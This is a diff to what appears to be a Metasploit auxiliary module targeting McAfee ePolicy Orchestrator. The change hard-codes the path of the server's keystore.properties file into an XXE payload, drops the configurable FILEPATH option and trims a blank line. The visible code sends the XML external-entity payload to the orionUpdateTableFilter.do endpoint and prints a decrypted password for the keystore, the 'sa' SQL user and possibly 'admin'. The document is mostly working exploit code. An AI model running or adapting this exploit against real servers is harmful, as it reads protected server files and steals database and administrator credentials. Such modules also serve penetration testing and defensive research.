@@ -50,7 +50,6 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(8443),
         OptBool.new('SSL', [true, 'Use SSL', true]),
         OptString.new('TARGETURI', [ true, "Base ePO directory path", '/']),
-        OptString.new('FILEPATH', [true, "The filepath to read on the server", "C:/Program Files (x86)/McAfee/ePolicy Orchestrator/Server/conf/orion/keystore.properties"]),
         OptString.new('USERNAME', [true, "The username to authenticate with", "username"]),
         OptString.new('PASSWORD', [true, "The password to authenticate with", "password"])
       ], self.class)
@@ -205,7 +204,8 @@ class Metasploit3 < Msf::Auxiliary
 
     print_status("Sending payload...")
 
-    xxe = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///'+datastore['FILEPATH']+'" >]><conditions><condition grouping="or"><prop-key>OrionTaskLogTaskMessage.Message</prop-key><op-key>eq</op-key><value>&xxe;</value></condition></conditions>'
+    filepath = "C:/Program Files (x86)/McAfee/ePolicy Orchestrator/Server/conf/orion/keystore.properties"
+    xxe = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///'+filepath+'" >]><conditions><condition grouping="or"><prop-key>OrionTaskLogTaskMessage.Message</prop-key><op-key>eq</op-key><value>&xxe;</value></condition></conditions>'
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'core', 'orionUpdateTableFilter.do'),
@@ -255,7 +255,6 @@ class Metasploit3 < Msf::Auxiliary
     passphrase = aes.update(Rex::Text.decode_base64(passphrase)) + aes.final
 
     print_good("The decrypted password for the keystore, 'sa' SQL user (if using local instance), and possibly 'admin' is: " + passphrase)
-
   end
 end
 
